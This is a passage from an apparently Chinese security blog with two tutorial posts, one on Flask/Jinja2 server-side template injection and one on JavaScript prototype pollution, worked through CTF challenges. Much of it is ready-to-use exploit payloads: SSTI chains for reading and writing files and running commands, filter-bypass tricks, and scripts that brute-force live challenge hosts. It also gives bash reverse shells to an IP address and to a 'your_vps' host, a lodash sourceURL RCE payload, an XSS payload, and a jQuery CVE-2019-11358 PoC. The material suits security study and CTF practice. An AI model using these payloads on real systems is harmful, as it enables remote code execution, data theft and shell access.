person['name'] = request.args.get('name') template = '&lt;h2&gt;Hello %s!&lt;/h2&gt;' % person['name'] return render_template_string(template, person=person)if __name__ == \"__main__\": app.run(debug=True) 这里就能得出结论了： SSTI漏洞点为在render_template_string()函数中，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击； SSTI漏洞风险只出现在render_template_string()函数，而render_template()函数并不存在SSTI风险，因为render_template()函数中是传入到一个模板HTML文件中，而该html文件这种的变量取值语句实现不了修改成%s这种形式的； 漏洞利用XSS传入什么返回什么，第一时间想到的就是XSS。之前的变量取值语句传入时是会进行自动HTML编码的，但%s传入的参数是不会自动进行HTML编码的，因为Flask并没有将整个内容视为字符串。 敏感信息泄露config是Flask模版中的一个全局对象，它代表”当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。 注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。 整合一下可利用的PoC技巧： 12345?name&#x3D;&#123;&#123;config&#125;&#125;?name&#x3D;&#123;&#123;person.secret&#125;&#125;?name&#x3D;&#123;&#123;self.__dict__&#125;&#125;?name&#x3D;&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;?name&#x3D;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125; 任意文件读写读文件 1234567# Python2?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd').read()&#125;&#125;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd').read()''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('E:/passwd').read()# Python3中无file，只能用open''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__builtins__']['open']('E:/passwd').read() 不知道哪个可以模块可以直接使用 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这里ptython的序号可以fuzz一下写文件 1234567# python2 ?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('E:/passwd','w').write('test')&#125;&#125;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd','w').write('test')''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('E:/passwd','w').write('test')# python3 命令执行利用from_pyfile加载对象到Flask配置环境这种利用方式算是一种简单的漏洞组合拳。 先利用文件写入漏洞写一个Python文件： 1?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;E:&#x2F;m7.py&#39;,&#39;w&#39;).write(&#39;from subprocess import check_output\\nRUNCMD&#x3D;check_output\\n&#39;)&#125;&#125; 然后使用config.from_pyfile将该Python文件加载到config变量中： 1?name&#x3D;&#123;&#123;config.from_pyfile(&#39;E:&#x2F;m7.py&#39;)&#125;&#125; 访问全局变量config查看是否加载成功：然后使用config.from_pyfile将该Python文件加载到config变量中： 1?name&#x3D;&#123;&#123;config.from_pyfile(&#39;E:&#x2F;m7.py&#39;)&#125;&#125; 访问全局变量config查看是否加载成功：加载成功后，就可以通过以下形式执行任意命令了： 1?name&#x3D;&#123;&#123;config[&#39;RUNCMD&#39;](&#39;whoami&#39;)&#125;&#125; 利用元素链中可利用的命令执行函数12python3:GET &#x2F;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[181].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;calc&#39;)&#125;&#125; 有回显的命令python2 123456789# os.popen(cmd).read()?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].popen('whoami').read()&#125;&#125;# platform.popen(cmd).read()?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('platform').popen('whoami').read()&#125;&#125;# sys.modules间接调用前面两个模块?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('sys').modules['os'].popen('whoami').read()&#125;&#125;?name=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('sys').modules['platform'].popen('whoami').read()&#125;&#125; python3 12345678910os.popen(cmd).read()?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[181].__init__.__globals__['linecache'].__dict__['os'].popen('whoami').read()&#125;&#125; platform.popen(cmd).read()?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[181].__init__.__globals__['__builtins__']['__import__']('platform').popen('whoami').read()&#125;&#125; sys.modules间接调用前面两个模块?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[181].__init__.__globals__['__builtins__']['__import__']('sys').modules['os'].popen('whoami').read()&#125;&#125;?name=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[181].__init__.__globals__['__builtins__']['__import__']('sys').modules['platform'].popen('whoami').read()&#125;&#125;` 反弹shell12''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1').read()\")''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('bash -i &gt;&amp; /dev/tcp/192.168.86.131/8080 0&gt;&amp;1').read() 控制结构12345# 命令执行?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('whoami').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;# 文件操作?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('E:/passwd', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; bypass无法直接获取全局变量config123?name=&#123;&#123;config&#125;&#125;?name=&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;?name=&#123;&#123;get_flashed_messages.__globals__['current_app'].config&#125;&#125; 过滤引号request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤： 1?name=&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path=e:/passwd.txt 过滤双下划线同样是利用Flask的request.args属性来绕过： 1?name=&#123;&#123;''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('E:/passwd.txt').read()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤[]等括号1\"\".__class__.__bases__.__getitem__(0) 过滤了__subclasses__，拼凑法实战例题[CSCCTF 2019 Qual]FlaskLight写个脚本寻找有用模块 1234567891011121314151617import requestsurl=\"http://00121ac8-b368-4116-bfde-a17de3e5d6fb.node3.buuoj.cn/?\"for i in range(1,1000): #print(i) payload=\"search=&#123;&#123;[].__class__.__mro__[1].__subclasses__()[%s]&#125;&#125;\"%i r=requests.get(url+payload).text #print(r) if 'subprocess.Popen' in r: print('subprocess.Popen: ' ,i) if 'file' in r: print('file: ',i) if 'catch_warnings' in r: print('catch_warnings: ' ,i) if 'WarningMessage' in r: print('WarningMessage: ' ,i) 读取/proc/self/cmdline 得到python /flasklight/app.py 1?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;proc&#x2F;self&#x2F;cmdline&#39;,&#39;r&#39;).read()&#125;&#125; 读取/flasklight/app.py 1?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;flasklight&#x2F;app.py&#39;,&#39;r&#39;).read()&#125;&#125; /flasklight/app.py 123456789101112131415161718192021222324252627from flask import Flask, request, render_template_string, abortapp = Flask(__name__)app.secret_key = 'CCC&#123;f4k3_Fl49_:v&#125; CCC&#123;the_flag_is_this_dir&#125;'result = [\"CCC&#123;Fl49_p@l5u&#125;\", \"CSC CTF 2019\", \"Welcome to CTF Bois\", \"CCC&#123;Qmu_T3rtyPuuuuuu&#125;\",\"Tralala_trilili\"]@app.route(\"/\")def search(): global result blacklist = ['url_for', 'listdir', 'globals'] search = request.args.get('search') or None if search is not None: for black in blacklist: if black in search: abort(500) if search in result: result = search return render_template_string( '''&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/body&gt; &lt;/html&gt;''' % ( search, result)) elif search == None: return render_template_string( '''&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt;&lt;br&gt; &lt;!-- Parameter Name: search --&gt; &lt;!-- Method: GET --&gt; &lt;/body&gt; &lt;/html&gt;''' % ( search, result)) else: result = [] return render_template_string( '''&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Flasklight&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;marquee&gt;&lt;h1&gt;Flasklight&lt;/h1&gt;&lt;/marquee&gt; &lt;h2&gt;You searched for:&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;br&gt; &lt;h2&gt;Here is your result&lt;/h2&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/body&gt; &lt;/html&gt;''' % ( search, result))if __name__ == \"__main__\": app.run(host=\"0.0.0.0\", port=9000) 过滤了global 1&#123;&#123;[].__class__.__bases__[0].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125; 可以拼接绕过 1&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&quot;ls&quot;).read()&#125;&#125; [RootersCTF2019]I_&lt;3_Flask12345678910111213141516171819import requestsurl=\"http://1713eb16-da0f-4b9f-bcb6-dd79d1cdf38a.node3.buuoj.cn/?name=\"for i in range(1,1000): #print(i) payload=\"&#123;&#123;ye1s.__class__.__mro__[1].__subclasses__()[%s]&#125;&#125;\"%i r=requests.get(url+payload).text #print(r) if 'subprocess.Popen' in r: print('subprocess.Popen: ' ,i) print(payload+\"('whoami',shell=True,stdout=-1).communicate()[0].strip()\") if 'file' in r: print('file: ',i) if 'catch_warnings' in r: print('catch_warnings: ' ,i) # print(payload+\".__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')\") if 'WarningMessage' in r: print('WarningMessage: ' ,i) 或者 1?name&#x3D;&#123;&#123;lipsum.__globals__.os.popen(&#39;whoami&#39;).read()&#125;&#125; 参考文章：Flask/Jinja2 SSTI 学习浅析Python Flask SSTIflask之ssti模版注入从零到入门Python模板注入(SSTI)深入学习","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://blog.cfyqy.com/tags/Flask/"},{"name":"SSTI","slug":"SSTI","permalink":"https://blog.cfyqy.com/tags/SSTI/"}],"author":"ye1s"},{"title":"javascript原型链污染","slug":"javascript原链污染","date":"2020-07-16T01:36:00.000Z","updated":"2021-05-13T04:58:23.975Z","comments":true,"path":"article/21a2aa63.html","link":"","permalink":"https://blog.cfyqy.com/article/21a2aa63.html","excerpt":"刚学完nodejs不久，趁热打铁将javascript原型链污染学习一下。","text":"刚学完nodejs不久，趁热打铁将javascript原型链污染学习一下。 JavaScript 是一门面向对象的语言，但是在 ES6 之前，JavaScript 中没有 class 语法。不过在它的构造函数（constructor）就相当于类，通过构造函数，我们可以生成实例化的对象。 原型 原型是Javascript中继承的基础,Javascript的继承就是基于原型的继承 js访问对象语法 原型对象 在JavaScript中,声明一个函数A的同时,浏览器在内存中创建一个对象B,然后A函数默认有一个属性prototype指向了这个对象B,这个B就是函数A的原型对象,简称为函数的原型。这个对象B默认会有个属性constructor指向了这个函数A。 prototypeJavaScript中的每个函数都有一个prototype 属性（显式原型）(仅限函数)，它指向调用该构造函数而创建的原型对象proto JavaScript 中，每个实例对象（函数，数组，对象）也都有一个__proto__属性用来指向原型对象(隐式原型)。 实例对象的 __proto__与创建该实例对象的构造函数的 prototype 是相等的。 12345function Cat() &#123; this.color &#x3D; &#39;white&#39;&#125;var cat &#x3D; new Cat() console.log(cat.__proto__ &#x3D;&#x3D;&#x3D; Cat.prototype) &#x2F;&#x2F; true constructor 每个原型对象都有一个 constructor 属性，指向相关联的构造函数，所以构造函数和构造函数的 prototype 是可以相互指向的。实例对象也可以访问constructor 属性指向其构造函数。 原型链 原型链是javascript的实现的形式,递归继承原型对象的原型,原型链的顶端是Object的原型。 1234567function Cat() &#123; this.color = 'white'&#125;Cat.prototype.age = 4var cat = new Cat()console.log(cat.color) // whiteconsole.log(cat.age) // 4 在 JavaScript 中，如果想访问某个属性，首先会在实例对象（cat）的内部寻找，如果没找到，就会在该对象的原型（cat.__proto__，即 Cat.prototype）上找，我们知道，对象的原型也是对象，它也有原型，如果在对象的原型上也没有找到目标属性，则会在对象的原型的原型（Cat.prototype.__proto__）上寻找，以此内推，直到找到这个属性或者到达了最顶层。在原型上一层一层寻找，这便就是原型链了。 实例对象原型的原型是Object.prototype，而它的原型是null，null 没有原型，所以 Object.prototype 就是原型链的最顶端。 继承 JavaScript 的继承是基于原型链的，在原型链的任何位置设置属性，都能被对象访问到，原型的作用也是在此，它可以包含所有实例共享的属性和方法，就像该属性本来就在实例对象上一样。 继承的查找过程: 调用对象属性时, 会查找属性，如果本身没有，则会去__proto__中查找，也就是构造函数的显式原型中查找，如果构造函数中也没有该属性，因为构造函数也是对象，也有__proto__，那么会去__proto__的显式原型中查找，一直到null 1234567891011121314151617181920212223function Cat() &#123; this.color = 'white' this.age = 5&#125;Cat.prototype.getColor = function() &#123; console.log(this.color)&#125;Object.prototype.getAge = function() &#123; console.log(this.age)&#125;var cat = new Cat()cat.getColor() // orangecat.getAge()var a = ['hello', 'world']function f() &#123;&#125;console.log(a.__proto__ === Array.prototype) // trueconsole.log(f.__proto__ === Function.prototype) // true 原型链污染在JavaScript中访问一个对象的属性可以用a.b.c或者a[“b”][“c”]来访问。由于对象是无序的，当使用第二种方式访问对象时，只能使用指明下标的方式去访问。因此我们可以通过a[&quot;__proto__&quot;]的方式去访问其原型对象。 原型链污染一般会出现在对象或数组的键名或属性名可控，而且是赋值语句的情况下。 在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。 例: 可以发现一个对象son修改自身的原型的属性的时候会影响到另外一个具有相同原型的对象son1 当我们修改上层的原型的时候,底层的实例会发生动态继承从而产生一些修改。 nodejs 命令执行常见的命令执行就是调用child_process模块来执行系统命令 12global.process.mainModule.require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1\"')global.process.mainModule.constructor._load('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1\"') 利用手段存在可控的对象键值 常发生在merge 等对象递归合并操作 对象克隆 路径查找属性然后修改属性的时候 dmeo:example1:example2: 123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 其在合并的过程中，存在赋值的操作target[key] = source[key]。因此，当我们控制target的键key为__proto__时就能污染原型链了。 先试下这个payload： 1234567let o1 = &#123;&#125;let o2 = &#123;a: 1, \"__proto__\": &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 可以看到并未污染成功： 这是因为，我们用JavaScript创建o2的过程 (let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}})中，__proto__已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是[a, b]，__proto__并不是一个key，自然也不会修改Object的原型。 因此，我们需要将o2实例对象那部分改为Json格式，如下： 1234567let o1 = &#123;&#125;let o2 = JSON.parse('&#123;\"a\": 1, \"__proto__\": &#123;\"b\": 2&#125;&#125;')merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 可以看到新建的o3实例对象也存在b属性，说明Object已经被污染了，这样就能成功进行原型链污染攻击了： 这是因为，JSON解析的情况下，proto会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。 例题分析xss题目地址: http://prompt.ml/13 123456789101112131415161718192021222324252627282930313233 function escape(input) &#123; &#x2F;&#x2F; extend method from Underscore library &#x2F;&#x2F; _.extend(destination, *sources) function extend(obj) &#123; var source, prop; for (var i &#x3D; 1, length &#x3D; arguments.length; i &lt; length; i++) &#123; source &#x3D; arguments[i]; for (prop in source) &#123; obj[prop] &#x3D; source[prop]; &#125; &#125; return obj; &#125; &#x2F;&#x2F; a simple picture plugin try &#123; &#x2F;&#x2F; pass in something like &#123;&quot;source&quot;:&quot;http:&#x2F;&#x2F;sandbox.prompt.ml&#x2F;PROMPT.JPG&quot;&#125; var data &#x3D; JSON.parse(input); var config &#x3D; extend(&#123; &#x2F;&#x2F; default image source source: &#39;http:&#x2F;&#x2F;placehold.it&#x2F;350x150&#39; &#125;, JSON.parse(input)); &#x2F;&#x2F; forbit invalid image source if (&#x2F;[^\\w:\\&#x2F;.]&#x2F;.test(config.source)) &#123; delete config.source; &#125; &#x2F;&#x2F; purify the source by stripping off &quot; var source &#x3D; config.source.replace(&#x2F;&quot;&#x2F;g, &#39;&#39;); &#x2F;&#x2F; insert the content using mustache-ish template return &#39;&lt;img src&#x3D;&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#39;.replace(&#39;&#123;&#123;source&#125;&#125;&#39;, source); &#125; catch (e) &#123; return &#39;Invalid image data.&#39;; &#125;&#125; 分析 12345678910function extend(obj) &#123; var source, prop; for (var i = 1, length = arguments.length; i &lt; length; i++) &#123; source = arguments[i]; for (prop in source) &#123; obj[prop] = source[prop]; &#125; &#125; return obj;//返回修改后的对象 &#125; 这个函数extends可以接收多个参数,然后赋值给了source变量,接着就对obj对象的键值进行了赋值操作,这个函数是可以导致原型污染链攻击的,但是具体怎么攻击我们还不知道, 继续分析下去。 12345678910111213var data = JSON.parse(input); //这里获取输入并且进行json解析 var config = extend(&#123; // default image source source: 'http://placehold.it/350x150' &#125;, JSON.parse(input)); //这里传入了漏洞函数,正常操作就是替换默认的image Source // forbit invalid image source if (/[^\\w:\\/.]/.test(config.source)) &#123; //这里只能允许字母数字\\ .字符,否则delete掉 delete config.source; &#125; // purify the source by stripping off \" var source = config.source.replace(/\"/g, '');//这里为了防止逃逸过滤了\" // insert the content using mustache-ish template return '&lt;img src=\"&#123;&#123;source&#125;&#125;\"&gt;'.replace('&#123;&#123;source&#125;&#125;', source);//这里拼接了source,这里是xss的点 这里可以里利用第一个正则匹配，delete了source的默认值,这样污染原型链覆盖的话,var source = config.source.replace(/&quot;/g, &#39;&#39;);就会去我们覆盖的原型去寻找source。 1&#123;&quot;source&quot;:&quot;%&quot;,&quot;__proto__&quot;: &#123;&quot;source&quot;: &quot;123&#39;&quot;&#125;&#125; 但是绕过”,我们可以考虑下replace一些性质 1&#39;&lt;img src&#x3D;&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#39;.replace(&#39;&#123;&#123;source&#125;&#125;&#39;, source); 我们看下文档: 字符串 stringObject 的 replace() 方法执行的是查找并替换的操作。它将在 stringObject 中查找与 regexp 相匹配的子字符串，然后用 replacement 来替换这些子串。如果 regexp 具有全局标志 g，那么 replace() 方法将替换所有匹配的子串。否则，它只替换第一个匹配子串。 replacement 可以是字符串，也可以是函数。如果它是字符串，那么每个匹配都将由字符串替换。但是 replacement 中的 $ 字符具有特定的含义。如下表所示，它说明从模式匹配得到的字符串将用于替换。 可以利用第二个参数做点事情: 1234&#39;123&#39;.replace(&quot;2&quot;,&#39;$&#96;&#39;);&quot;113&quot;&#39;123&#39;.replace(&quot;2&quot;,&quot;$&#39;&quot;);&quot;133&quot; 最终payload: 1&#123;&quot;source&quot;:&quot;%&quot;,&quot;__proto__&quot;: &#123;&quot;source&quot;: &quot;$&#96; onerror&#x3D;prompt(1)&gt;&lt;!--&quot;&#125;&#125; 解析结果: 1&lt;img src&#x3D;&quot;&lt;img src&#x3D;&quot; onerror&#x3D;prompt(1)&gt;&lt;!--&quot;&gt; Code-Breaking 2018 Thejs这是P神在代码审计中出的一道JS原型链污染题目。 题目环境：https://github.com/phith0n/code-breaking/tree/master/2018/thejs大佬的解：Code Breaking 挑战赛 Writeup server.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require('fs')const express = require('express')const bodyParser = require('body-parser')const lodash = require('lodash')const session = require('express-session')const randomize = require('randomatic')const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use('/static', express.static('static'))app.use(session(&#123; name: 'thejs.session', secret: randomize('aA0', 16), resave: false, saveUninitialized: false&#125;))app.engine('ejs', function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set('views', './views')app.set('view engine', 'ejs')app.all('/', (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == 'POST') &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render('index', &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`)) 可以看到，这里存在一个用户输入点lodash.merge(data, req.body)，即在请求方法为POST时直接将req.body的值作为lodash.merge()的第二个参数传入，而我们在前面知道merge()函数是合并数组的操作，同时也是原型链污染的常见场景，因此我们可以通过POST方式传入的请求体内容来污染data数组。 在污染原型链后，我们相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的lodash.template中。 我们去看下lodash.template()的源码吧： 1234567&#x2F;&#x2F; Use a sourceURL for easier debugging.var sourceURL &#x3D; &#39;sourceURL&#39; in options ? &#39;&#x2F;&#x2F;# sourceURL&#x3D;&#39; + options.sourceURL + &#39;\\n&#39; : &#39;&#39;;&#x2F;&#x2F; ...var result &#x3D; attempt(function() &#123; return Function(importsKeys, sourceURL + &#39;return &#39; + source) .apply(undefined, importsValues);&#125;); options是一个对象，sourceURL取到了其options.sourceURL属性。这个属性原本是没有赋值的，默认取空字符串。 但因为原型链污染，我们可以给所有Object对象中都插入一个sourceURL属性。最后，这个sourceURL被拼接进new Function的第二个参数中，造成任意代码执行漏洞。 了解一下，Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数：而Function.apply(object, args)可以调用该函数，可以理解为object.function(arg1, arg2)，args=[arg1, arg2]： 再看下attempt是干啥的，在attemp.js中有定义： 1234567var attempt &#x3D; baseRest(function(func, args) &#123; try &#123; return apply(func, undefined, args); &#125; catch (e) &#123; return isError(e) ? e : new Error(e); &#125;&#125;); 说到底attempt就是func.apply()，就是执行定义的函数。 那么options是怎么传进来的？我们回到server.js： 12let compiled = lodash.template(content)let rendered = compiled(&#123;...options&#125;) 这里三个点是将options数组打散为序列的意思。到这我们还是不能确定options是否可控，但这没必要去考虑，因为我们通过原型链污染来污染Object.sourceURL，致使在寻找options.sourceURL时JS引擎还是能成功在options的原型链上找到该属性。 至此，也就是说，当我们通过原型链污染致使options.sourceURL存在值时，程序会将options.sourceURL污染值拼接到Function()的第二个参数中，导致任意代码执行。题解缺陷payload根据上述分析，可以通过原型链污染致使Object存在污染进来的sourceURL属性，从而导致options也有sourceURL属性进而任意代码执行。 下面这个是有缺陷的payload： 1\"__proto__\": &#123;\"sourceURL\": \"\\nreturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('ls /')&#125;\\n\"&#125;&#125; 之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计Function(importsKeys, sourceURL + ‘return ‘ + source)中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function 发送前，注意Content-Type改为application/json：虽然能执行命令拿到flag，但是Web页面不能再直接访问了。这是因为只要在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务。如果在ctf比赛中，也会让其他队伍拿到flag 优化payload在上一个基础上，在执行本次命令之前用for循环把之前的污染删掉： 1&#123;\"__proto__\": &#123;\"sourceURL\": \"\\nreturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag_thepr0t0js')&#125;\\n\"&#125;&#125; 此时的Web服务能正常访问。 jQuery原型污染漏洞（CVE-2019-11358）在jQuery &lt; 3.4.0的版本中存在原型污染漏洞。 在./src/core.js第155行中，options取传入的参数 arguments[i]： 1if ((options &#x3D; arguments[ i ]) !&#x3D; null) &#123; 而后在第158 、159 行中，将options遍历赋值给copy，即copy外部可控： 1for (name in options) &#123; copy&#x3D; options [name]; 接着，在第167-185行中，判断copy是否是数组；若是，则调用jQuery.extend()函数，该函数用于将一个或多个对象的内容合并到目标对象，这里是将外部可控的copy数组扩展到target数组中；若copy非数组而是个对象，则直接将copy变量值赋值给target[name]： 12345678// Recurse if we're merging plain objects or arraysif ( deep &amp;&amp; copy &amp;&amp; ( jQuery.isPlainObject( copy ) || ( copyIsArray = Array.isArray( copy ) ) ) ) &#123; ... // Never move original objects, clone them target[ name ] = jQuery.extend( deep, clone, copy ); // Don't bring in undefined values&#125; else if ( copy !== undefined ) &#123; target[ name ] = copy;&#125; 此时，如果name可以被设置为proto，则会向上影响target的原型，进而覆盖造成原型污染。 往前面找，在第127行中可以看到，target数组是取传入的参数arguments[0]： 1target &#x3D; arguments[ 0 ] || &#123;&#125;, 也就是说，target变量可以通过外部传入的参数arguments数组的第一个元素来设置target数组的键name对应的值为__proto__，而options变量可通过外部传入的参数arguments[i]进行赋值，copy变量又是由options遍历赋值的，进而导致copy变量外部可控，最后会将copy合入或赋值到target数组中，因此当target[__proto__]=外部可控的copy时就存在原型污染漏洞了。 简单地说，就是target[name]=copy的赋值语句两边均可控，导致JS原型污染漏洞的存在。 因此可以构造如下PoC来验证，先引入漏洞版本的jQuery，再进行JS原型污染攻击： 12345var jquery = document.createElement('script'); jquery.src = 'https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js';document.getElementsByTagName('head')[0].appendChild(jquery);let a = $.extend(true, &#123;&#125;, JSON.parse('&#123;\"__proto__\": &#123;\"devMode\":\"Hacked By LiMing\"&#125;&#125;'));console.log(&#123;&#125;.devMode); [GYCTF2020]Ez_Express12345678910111213const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125; /route/index.js中用了merge()和clone()，必是原型链了 往下找到clone()的位置 12345router.post('/action', function (req, res) &#123; if(req.session.user.user!=\"ADMIN\")&#123;res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")&#125; req.session.user.data = clone(req.body); res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"); &#125;); 需要admin账号才能用到clone() 于是去到/login处 123456789101112131415161718192021222324router.post('/login', function (req, res) &#123; if(req.body.Submit==\"register\")&#123; if(safeKeyword(req.body.userid))&#123; res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\") &#125; req.session.user=&#123; 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false &#125; res.redirect('/'); &#125; else if(req.body.Submit==\"login\")&#123; if(!req.session.user)&#123;res.end(\"&lt;script&gt;alert('register first');history.go(-1);&lt;/script&gt;\")&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(\"&lt;script&gt;alert('error passwd');history.go(-1);&lt;/script&gt;\") &#125; &#125; res.redirect('/'); ;&#125;); 可以看到验证了注册的用户名不能为admin（大小写），不过有个地方可以注意到 1'user':req.body.userid.toUpperCase(), 这里将user给转为大写了，这种转编码的通常都很容易出问题 参考p牛的文章 Fuzz中的javascript大小写特性 https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 注册admın（此admın非彼admin，仔细看i部分） 